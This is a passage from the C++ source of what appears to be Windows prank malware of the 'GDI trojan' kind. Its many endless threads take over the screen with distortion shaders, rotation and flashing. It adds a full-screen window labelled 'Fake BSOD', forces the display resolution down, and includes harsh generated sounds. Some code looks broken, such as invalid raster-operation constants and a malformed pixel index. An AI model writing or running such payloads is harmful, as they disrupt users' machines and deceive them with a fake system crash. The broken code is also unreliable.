                int fx = (int)((i ^ 5) + (i ^ 5) * tan(x & y));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}
DWORD WINAPI PlgBlt1(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    RotateAndDisplayScreen();
    return 0;
}
DWORD WINAPI PlgBlt2(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    RotateAndDisplayScreen2();
    return 0;
}
DWORD WINAPI PlgBlt3(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    RotateAndDisplayScreen3();
    return 0;
}
DWORD WINAPI PlgBlt4(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    RotateAndDisplayScreen4();
    return 0;
}
DWORD WINAPI PlgBlt5(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    RotateAndDisplayScreen5();
    return 0;
}
DWORD WINAPI RedFlash(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);

    while (true) {
        FlashScreenRed(hdcScreen);
    }

    ReleaseDC(NULL, hdcScreen);
    return 0;
}
DWORD WINAPI JuliaFractal(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);

    while (true) {
        ApplyJuliaSetEffect(hdcScreen);
    }

    ReleaseDC(NULL, hdcScreen);
    return 0;
}
DWORD WINAPI Shader9(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    int radius = -16.f; double angle = 0;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pBits = nullptr;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
    SelectObject(hdcMem, hbmTemp);

    srand(static_cast<unsigned int>(time(0)));

    while (true) {
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                int index = x ^ y * w;

                BYTE originalRed = pBits[index].rgbRed;
                BYTE originalGreen = pBits[index].rgbGreen;
                BYTE originalBlue = pBits[index].rgbBlue;

                BYTE fractalRed = (x ^ y) / 2;
                BYTE fractalGreen = (x ^ y) * 2;
                BYTE fractalBlue = x ^ y;

                pBits[index].rgbRed = static_cast<BYTE>(0.4 * originalRed + 0.2 * fractalRed);
                pBits[index].rgbGreen = static_cast<BYTE>(0.4 * originalGreen + 0.2 * fractalGreen);
                pBits[index].rgbBlue = static_cast<BYTE>(0.4 * originalBlue + 0.2 * fractalBlue);

                pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.4);
                pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.4));
                pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.4);

                pBits[index].rgbRed = static_cast<BYTE>(0.1 * fractalBlue + 0.1 * fractalGreen);
                pBits[index].rgbGreen = static_cast<BYTE>(0.1 * fractalRed + 0.1 * fractalBlue);
                pBits[index].rgbBlue = static_cast<BYTE>(0.1 * fractalGreen + 0.1 * fractalRed);

                if (rand() % 100 < 50) {
                    pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 12 + rand() % 100);
                    pBits[index].rgbGreen = static_cast<BYTE>(pBits[index].rgbGreen * 12 + rand() % 100);
                    pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 12 + rand() % 100);
                }
            }
        }
        float x = cos(angle) * radius, y = sin(angle) * radius;
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
        angle = fmod(angle + M_PI / radius, M_PI * radius);
    }
    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    return 0;
}
DWORD WINAPI Shader10(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pBits = nullptr;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
    SelectObject(hdcMem, hbmTemp);

    srand(static_cast<unsigned int>(time(0)));

    while (true) {
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

        int shift = rand() % 100;
        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                int index = x + y * w;

                BYTE gradientRed = static_cast<BYTE>(128 + 127 * sin((x + shift) * 0.01));
                BYTE gradientGreen = static_cast<BYTE>(128 + 127 * sin((y - shift) * 0.01));
                BYTE gradientBlue = static_cast<BYTE>(128 + 127 * cos((x - y) * 0.01));

                int fractal = (x ^ y) % 256;
                BYTE fractalRed = static_cast<BYTE>((gradientRed * 0.7) + (fractal * 0.3));
                BYTE fractalGreen = static_cast<BYTE>((gradientGreen * 0.7) + (fractal * 0.3));
                BYTE fractalBlue = static_cast<BYTE>((gradientBlue * 0.7) + (fractal * 0.3));

                if (rand() % 100 < 20) {
                    fractalRed = static_cast<BYTE>(fractalRed * 0.6 + rand() % 50);
                    fractalGreen = static_cast<BYTE>(fractalGreen * 0.6 + rand() % 50);
                    fractalBlue = static_cast<BYTE>(fractalBlue * 0.6 + rand() % 50);
                }

                pBits[index].rgbRed = fractalRed;
                pBits[index].rgbGreen = fractalGreen;
                pBits[index].rgbBlue = fractalBlue;
            }
        }

        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
    }
    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    return 0;
}
DWORD WINAPI Shader11(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pBits = nullptr;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
    SelectObject(hdcMem, hbmTemp);

    srand(static_cast<unsigned int>(time(0)));
    POINT pt;

    while (true) {
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

        GetCursorPos(&pt);

        int timeShift = rand() % 1000;
        int mouseX = pt.x;
        int mouseY = pt.y;

        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                int index = x + y * w;

                double wave = sin((x + timeShift) * 0.01) + cos((y - timeShift) * 0.01);
                BYTE gradRed = static_cast<BYTE>(128 + 127 * sin(wave));
                BYTE gradGreen = static_cast<BYTE>(128 + 127 * cos(wave));
                BYTE gradBlue = static_cast<BYTE>(128 + 127 * sin(wave * 0.7));

                BYTE noise = rand() % 50;
                gradRed = static_cast<BYTE>(gradRed * 0.8 + noise);
                gradGreen = static_cast<BYTE>(gradGreen * 0.8 + noise);
                gradBlue = static_cast<BYTE>(gradBlue * 0.8 + noise);

                int fractal = ((x ^ y) + (mouseX ^ mouseY)) % 256;
                BYTE fractalRed = static_cast<BYTE>((fractal * 0.3) + gradRed * 0.7);
                BYTE fractalGreen = static_cast<BYTE>((fractal * 0.3) + gradGreen * 0.7);
                BYTE fractalBlue = static_cast<BYTE>((fractal * 0.3) + gradBlue * 0.7);

                pBits[index].rgbRed = fractalRed;
                pBits[index].rgbGreen = fractalGreen;
                pBits[index].rgbBlue = fractalBlue;
            }
        }

        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
    }

    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    return 0;
}
DWORD WINAPI Shader12(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);

    if (!hdc) {
        MessageBox(NULL, L"!!!", L"...", MB_OK | MB_ICONERROR);
        return -1;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        static int frame = 0;
        frame++;

        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                int r = (int)(128 + 127 * log(0.01 * x + frame * 0.03));
                int g = (int)(128 + 127 * sqrt(0.01 * y + frame * 0.02));
                int b = (int)(128 + 127 * tan(0.01 * (x + y) + frame * 0.01));

                COLORREF color = RGB(r, g, b);

                SetPixel(hdc, x, y, color);
            }
        }
    }

    ReleaseDC(NULL, hdc);

    return 0;
}
DWORD WINAPI Shader13(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);

    if (!hdc) {
        MessageBox(NULL, L"!!!", L"...", MB_OK | MB_ICONERROR);
        return -1;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        static int frame = 0;
        frame++;

        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                int r = (int)(128 + 127 * log(0.01 * x + frame * 0.03));
                int g = (int)(128 + 127 * sqrt(0.01 * y + frame * 0.02));
                int b = (int)(128 + 127 * tan(0.01 * (x + y) + frame * 0.01));

                COLORREF color = RGB(r, g, b);

                SetPixel(hdc, x, y, color);
            }
        }
    }

    ReleaseDC(NULL, hdc);

    return 0;
}
DWORD WINAPI Shader14(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);

    if (!hdc) {
        MessageBox(NULL, L"!!!", L"...", MB_OK | MB_ICONERROR);
        return -1;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        static int frame = 0;
        frame++;

        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                int r = (int)(128 + 127 * cos(0.01 * x + frame * 0.03));
                int g = (int)(128 + 127 * sin(0.01 * y + frame * 0.02));
                int b = (int)(128 + 127 * log(0.01 * (x + y) + frame * 0.01));

                COLORREF color = RGB(r, g, b);

                SetPixel(hdc, x, y, color);
            }
        }
    }

    ReleaseDC(NULL, hdc);

    return 0;
}
DWORD WINAPI Shader15(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);

    if (!hdc) {
        MessageBox(NULL, L"!!!", L"...", MB_OK | MB_ICONERROR);
        return -1;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        static int frame = 0;
        frame++;

        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                int r = (int)(128 + 127 * sqrt(0.01 * x + frame * 0.03));
                int g = (int)(128 + 127 * log10(0.01 * y + frame * 0.02));
                int b = (int)(128 + 127 * sinf(0.01 * (x + y) + frame * 0.01));

                COLORREF color = RGB(r, g, b);

                SetPixel(hdc, x, y, color);
            }
        }
    }

    ReleaseDC(NULL, hdc);

    return 0;
}
DWORD WINAPI Shader16(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    int i = 0;
    while (1)
    {
        desk = GetDC(0);
        i -= 1;
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(desk, i, 0, sw, sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, i, 0, sw, sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, 0, i, sw, sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, 0, i, sw, sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, i, 0, sw, sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, i, 0, sw, sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, 0, i, sw, sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, 0, i, sw, sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, i, 0, sw, sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, -i, 0, sw, sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, 0, i, sw, sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, 0, -i, sw, sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, i, 0, sw, sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, -i, 0, sw, sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, 0, i, sw, sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, 0, -i, sw, sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, i, 0, -sw, -sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, i, 0, -sw, -sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, 0, i, -sw, -sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, 0, i, -sw, -sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, i, 0, -sw, -sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, i, 0, -sw, -sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, 0, i, -sw, -sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, 0, i, -sw, -sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, i, 0, -sw, -sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, -i, 0, -sw, -sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, 0, i, -sw, -sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, 0, -i, -sw, -sh, desk, 0, 0, 0x794869BFEDC);
        BitBlt(desk, i, 0, -sw, -sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, -i, 0, -sw, -sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, 0, i, -sw, -sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, 0, -i, -sw, -sh, desk, 0, 0, 0x3428764278CCFFF);
        BitBlt(desk, -i, -0, -sw, -sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -i, -0, -sw, -sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -0, -i, -sw, -sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -0, -i, -sw, -sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -i, -0, -sw, -sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -i, -0, -sw, -sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -0, -i, -sw, -sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -0, -i, -sw, -sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -i, -0, -sw, -sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, --i, -0, -sw, -sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -0, -i, -sw, -sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -0, --i, -sw, -sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -i, -0, -sw, -sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, --i, -0, -sw, -sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -0, -i, -sw, -sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -0, --i, -sw, -sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -i, -0, --sw, --sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -i, -0, --sw, --sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -0, -i, --sw, --sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -0, -i, --sw, --sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -i, -0, --sw, --sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -i, -0, --sw, --sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -0, -i, --sw, --sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -0, -i, --sw, --sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -i, -0, --sw, --sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, --i, -0, --sw, --sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -0, -i, --sw, --sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -0, --i, --sw, --sh, desk, -0, -0, -0x794869BFEDC);
        BitBlt(desk, -i, -0, --sw, --sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, --i, -0, --sw, --sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -0, -i, --sw, --sh, desk, -0, -0, -0x3428764278CCFFF);
        BitBlt(desk, -0, --i, --sw, --sh, desk, -0, -0, -0x3428764278CCFFF);
        ReleaseDC(0, desk);
    }
}
DWORD WINAPI Shader17(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc, hdcMem;
    HBITMAP hbm;
    for (int i = 64;; i++, i %= 32)
    {
        hdc = GetDC(0);
        hdcMem = CreateCompatibleDC(hdc);
        hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 32; w * h > i; i++)
        {
            int v = 2;
            ((BYTE*)(data + i))[2] = ((BYTE*)(data + i + v))[2] + -5.;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
        DeleteObject(hbm);
        DeleteObject(hdcMem);
        DeleteObject(hdc);
    }
}
DWORD WINAPI ShaderFinal(LPVOID lpParam) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    int j = 256;

    INT nw = x / 16;
    INT nh = y / 16;

    COLOR* data = (COLOR*)VirtualAlloc(0, nw * nh * sizeof(COLOR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateBitmap(nw, nh, 1, 32, data);

    SelectObject(mdc, bmp);

    SetStretchBltMode(hdc, COLORONCOLOR);
    SetStretchBltMode(mdc, COLORONCOLOR);

    while (true) {
        StretchBlt(mdc, 0, 0, nw, nh, hdc, 0, 0, x, y, SRCCOPY);
        SetBitmapBits(bmp, nw * nh * sizeof(COLOR), data);

        for (int i = 128; i < nw * nh; i++) {
            data[i].rgb = COLORHSL(((i ^ x) ^ j) | ((i ^ y) ^ j) * ((i ^ x) ^ j) & (int)(fade((x ^ y) * j)));
            data[i].rgb = COLORHSL(((i * x) ^ j) ^ ((i * y) ^ j) * ((i * x) ^ j) & (int)(fade((x * y) * j)));
            data[i].rgb = COLORHSL(((i & x) ^ j) * ((i ^ y) ^ j) ^ ((i + x) ^ j) ^ (int)(fade((x ^ y) * j)));
            data[i].rgb = COLORHSL(((i | x) & j) >> ((i * y) & j) << ((i - x) >> j) * (int)(fade((x * y) ^ j)));
        }

        StretchBlt(hdc, 0, 0, x, y, mdc, 0, 0, nw, nh, SRCCOPY);
        SetBitmapBits(bmp, nw * nh * sizeof(COLOR), data);

        j += 256;
    }
}
DWORD WINAPI Rotate(LPVOID lpParam) {
    float angle = 0.0f;
    while (true) {
        RotateScreen(angle);
        angle += 1.0f;
        if (angle >= 360.0f) angle = 0.0f;
        Sleep(100);
    }
    return 0;
}
DWORD WINAPI RGBScroll(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);

    while (true) {
        ApplyRGB3DScrollEffect(hdcScreen);
    }

    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Shader8(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    ApplyCustomRGBShader(hdcScreen);
    ReleaseDC(NULL, hdcScreen);
    return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//Special
typedef LONG(WINAPI* RtlGetVersionFunc)(OSVERSIONINFOEXW*);
void HideCursor() {
    CONSOLE_CURSOR_INFO cursorInfo;
    HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);

    GetConsoleCursorInfo(consoleHandle, &cursorInfo);
    cursorInfo.bVisible = FALSE;
    SetConsoleCursorInfo(consoleHandle, &cursorInfo);
}

void ShowCursor() {
    CONSOLE_CURSOR_INFO cursorInfo;
    HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);

    GetConsoleCursorInfo(consoleHandle, &cursorInfo);
    cursorInfo.bVisible = TRUE;
    SetConsoleCursorInfo(consoleHandle, &cursorInfo);
}
DWORD WINAPI ChangeResolution(LPVOID lpParam) {
    if (SetResolution(800, 600)) {
        std::cout << "IT'S NOT OVER" << std::endl;
    }
    else {
        std::cout << "Oh!" << std::endl;
    }

    system("pause");
    return 0;
}
void RunWindows7Code(LPVOID lpParam, HINSTANCE hInstance) {
    CreateThread(0, 0, ChangeResolution, 0, 0, 0);
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_BACKGROUND);
    wc.lpszClassName = L"FakeBSODWindow";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, wc.lpszClassName, L"Fake BSOD", WS_POPUP, 0, 0,
        GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void RunWindows8Code(LPVOID lpParam, HINSTANCE hInstance) {
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc2;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_BACKGROUND);
    wc.lpszClassName = L"FakeBSODWindow";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, wc.lpszClassName, L"Fake BSOD", WS_POPUP, 0, 0,
        GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void RunWindows10Code(LPVOID lpParam, HINSTANCE hInstance) {
    HideCursor();
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc3;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_BACKGROUND);
    wc.lpszClassName = L"FakeBSODWindow";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, wc.lpszClassName, L"Fake BSOD", WS_POPUP, 0, 0,
        GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void RunWindows11Code(LPVOID lpParam, HINSTANCE hInstance) {
    HideCursor();
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc4;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_BACKGROUND);
    wc.lpszClassName = L"FakeBSODWindow";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, wc.lpszClassName, L"Fake BSOD", WS_POPUP, 0, 0,
        GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
DWORD WINAPI FakeBSOD(LPVOID lpParam, HINSTANCE hInstance) {
    OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        RtlGetVersionFunc RtlGetVersion = (RtlGetVersionFunc)GetProcAddress(hMod, "RtlGetVersion");
        if (RtlGetVersion && RtlGetVersion(&osvi) == 0) {
            if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) {
                RunWindows7Code(0, 0);
            }
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2) {
                RunWindows8Code(0, 0);
            }
            else if (osvi.dwMajorVersion == 10 && osvi.dwBuildNumber < 22000) {
                RunWindows10Code(0, 0);
            }
            else if (osvi.dwMajorVersion == 10 && osvi.dwBuildNumber >= 22000) {
                RunWindows11Code(0, 0);
            }
            else {
                std::cout << "Unsupported Windows version.\n";
            }
        }
    }
    else {
        std::cout << "Failed to get OS version information.\n";
    }

    return 0;
}




/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//Sounds
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + 8 >> (t >> 9) * t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 8 | t | t >> (t >> 16)) + (t >> 6 | t << 2 | t >> 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8100 * 32] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(2 * (t >> 5 & t) - (t >> 5) + t * (t >> 14 & 14));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3_1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
